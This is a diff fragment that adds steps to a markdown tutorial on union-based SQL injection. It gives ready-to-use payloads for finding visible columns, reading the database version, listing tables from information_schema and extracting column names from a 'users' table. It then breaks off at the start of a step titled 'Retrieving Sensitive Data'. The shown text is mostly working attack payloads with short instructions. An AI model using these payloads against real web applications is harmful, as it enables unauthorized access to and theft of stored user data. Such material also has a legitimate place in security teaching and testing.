@@ -128,4 +128,26 @@ Union-based SQL injection leverages the UNION SQL operator to combine results fr
 
 2. **Identify useful columns**:
    ```sql
-   ' UNION SELECT 1,2,3,4,
+   ' UNION SELECT 1,2,3,4,5--
+   ```
+   Note which numbers appear in output
+
+## Step 6: Extracting Data
+1. **Get database version** (replace visible column number):
+   ```sql
+   ' UNION SELECT 1,@@version,3,4,5--
+   ```
+
+2. **List tables**:
+   ```sql
+   ' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables--
+   ```
+
+3. **Extract column names from interesting tables**:
+   ```sql
+   ' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--
+   ```
+
+## Step 7: Retrieving Sensitive Data
+```sql
+' UNION SELECT 1
